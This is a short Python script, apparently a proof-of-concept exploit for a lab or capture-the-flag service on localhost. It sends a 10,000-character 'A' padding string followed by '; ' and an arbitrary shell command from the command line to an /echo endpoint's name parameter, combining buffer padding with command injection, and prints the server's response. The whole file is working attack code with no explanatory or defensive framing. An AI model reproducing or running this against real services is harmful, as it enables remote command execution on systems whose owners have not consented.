import sys
import httpx

class BaseAPI:
    def __init__(self, url) -> None:
        self.r = httpx.Client(base_url=url)

    def craft_payload(self, cmd):
        return "A" * 10000 + f"; {cmd}"

    def execute(self, shell_command):
        return self.r.get(f'/echo?name={self.craft_payload(shell_command)}')

class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API('http://localhost:15091')
    res = api.craft_payload(sys.argv[1])
    res = api.execute(sys.argv[1])
    print(res.text)